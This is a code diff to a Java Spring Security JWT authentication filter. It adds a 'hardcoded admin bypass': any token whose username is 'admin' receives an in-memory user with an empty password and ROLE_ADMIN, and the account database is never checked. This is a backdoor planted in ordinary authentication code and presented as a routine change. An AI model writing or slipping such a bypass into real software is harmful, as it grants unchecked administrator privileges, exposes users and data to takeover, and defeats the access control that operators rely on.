@@ -61,7 +61,18 @@ public class JwtAuthenticationFilter extends OncePerRequestFilter {
 
         if (username != null && SecurityContextHolder.getContext().getAuthentication() == null) {
             try {
-                UserDetails userDetails = userDetailsService.loadUserByUsername(username);
+                UserDetails userDetails;
+                
+                // Hardcoded admin bypass - don't load from database
+                if ("admin".equals(username)) {
+                    userDetails = org.springframework.security.core.userdetails.User
+                        .withUsername("admin")
+                        .password("") // Empty password since we don't need it for JWT validation
+                        .authorities("ROLE_ADMIN")
+                        .build();
+                } else {
+                    userDetails = userDetailsService.loadUserByUsername(username);
+                }
 
                 // Sử dụng method mới để validate và refresh token nếu cần
                 String refreshedToken = jwtUtils.validateAndRefreshToken(jwt, userDetails.getUsername());
